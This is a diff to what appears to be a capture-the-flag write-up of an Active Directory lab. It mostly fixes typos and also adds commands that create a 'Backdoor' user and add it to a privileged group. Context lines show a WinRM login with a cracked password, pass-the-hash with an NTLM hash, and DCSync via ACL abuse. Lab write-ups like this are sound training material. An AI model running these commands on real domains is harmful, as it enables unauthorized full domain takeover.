@@ -6,7 +6,7 @@
 
 - Difficulty: Easy
 - Platform: Active Directory
-- Skills Demonstrated: Active Directory, SMB Enumeration, AS-REP Roasting, Password Decryption, Windows Privilege Escalation, Group Permissions Exploitation
+- Skills Demonstrated: Active Directory, SMB Enumeration, AS-REP Roasting, Password Cracking, Windows Privilege Escalation, Group Permissions Exploitation
 
 ## Methodology 
 
@@ -20,7 +20,7 @@ The assessment followed a standard attack methodology:
 
 ## Enumeration
 
-Intial enumeration was performed by running a port scan to idenitfy open ports and services
+Initial enumeration was performed by running a port scan to idenitfy open ports and services
 ```
 nmap 10.129.95.210 -sCV -A -p-
 ```
@@ -91,18 +91,18 @@ evil-winrm -i 10.129.95.210 -u svc-alfresco -p s3rvice
 
 ## Privilege Escalation
 
-Now that intial access has been obtained, the privileges assigned to `svc-alfresco` were examined to identify potential privilege escalation paths. In this case the user is a member of the `Account Operators` group, a highly privileged group that can be exploited to further abuse group and user privileges ultimately leading to Domain compromise.  
+Now that initial access has been obtained, the privileges assigned to `svc-alfresco` were examined to identify potential privilege escalation paths. In this case the user is a member of the `Account Operators` group, a highly privileged group that can be exploited to further abuse group and user privileges ultimately leading to Domain compromise.  
 
 
 This can be achieved because `Account Operators` can modify user objects for any user that is not a member of one of the protected groups: Administrators, Domain Admins and Enterprise Admins
 
 ![privs](Images/privs.png)
 
-`Bloodhound`was used to visualise and idenitfy Active Directory escalation paths. 
+`Bloodhound` was used to visualise and idenitfy Active Directory escalation paths. 
 
 ### BloodHound
 
-The BloodHound injestor `SharpHound` was used to collect the Active Directory information
+The BloodHound ingestor `SharpHound` was used to collect the Active Directory information
 ```
 Import-Module .\SharpHound.ps1
 Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\svc-alfresco\Desktop -OutputPrefix "collector"
@@ -123,6 +123,11 @@ HTB.LOCAL
 ```
 
 A new domain user (`Backdoor`) was created and added to the `Exchange Windows Permissions` group. Since this group has `WriteDACL` permissions over the domain object, the account was able to modify the domain ACL. `PowerView` was then used to grant the account the replication permissions (`DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All`) required to perform a DCSync attack and retrieve credentials from the domain controller.
+```
+net user Backdoor Password1 /add
+net group "Exchange Windows Permissions" Backdoor /add
+```
+
 ```
 $SecPassword = ConvertTo-SecureString 'password' -AsPlainText -Force
 
@@ -145,7 +150,7 @@ evil-winrm -i 10.129.95.210 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
 
 ## Conclusion
 
-This assessment demonstrated how multiple small misconfigurations within an Active Directory environment can be chained together to achieve full domain compromise. Starting with anonymous user enumeration, an AS-REP roasting vulnerability exposed valid credentials, which provided initial access via WinRM. Further privilege analysis revealed excessive permissions assigned through Active Directory group memberships, ultimately allowing DCSync rights to be granted and the Administrator account to be compromised.
+This assessment demonstrated how multiple small misconfigurations within an Active Directory environment can be chained together to achieve full domain administrator privileges. Starting with anonymous user enumeration, an AS-REP roasting vulnerability exposed valid credentials, which provided initial access via WinRM. Further privilege analysis revealed excessive permissions assigned through Active Directory group memberships, ultimately allowing DCSync rights to be granted and the Administrator account to be compromised.
 
 ## Lessons Learned
 
